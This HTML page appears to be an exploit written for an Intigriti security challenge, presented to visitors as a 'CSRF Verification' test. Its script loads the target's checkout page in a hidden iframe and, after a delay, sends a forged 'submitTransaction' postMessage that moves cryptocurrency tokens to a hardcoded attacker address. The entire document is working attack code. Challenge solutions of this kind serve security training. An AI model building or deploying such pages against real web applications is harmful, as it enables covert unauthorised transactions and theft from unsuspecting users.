<!DOCTYPE html>
<html>
<head>
    <title>CSRF Verification</title>
</head>
<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
    <h1>CSRF Test in Progress...</h1>
    <p>Transferring tokens to: 1209f27d...bfe9</p>

    <script>
        const target = "https://challenge-0126.intigriti.io";
        const myAddress = "1209f27d01fff1d414f1da176e75abbfe9";

        // 1. Create hidden iframe to the vulnerable checkout page
        const ifr = document.createElement('iframe');
        ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
        ifr.style.display = 'none';
        document.body.appendChild(ifr);

        ifr.onload = () => {
            // 2. Wait for the checkout page to be ready
            setTimeout(() => {
                // 3. CSRF Trigger: Send the message that the checkout page trusts implicitly
                ifr.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: myAddress, // Your real address, no XSS
                        currency: '1337COIN',
                        amount: 0.000001
                    }
                }, '*');

                console.log("Transaction request sent.");
            }, 1500);
        };
    </script>
</body>
</html>
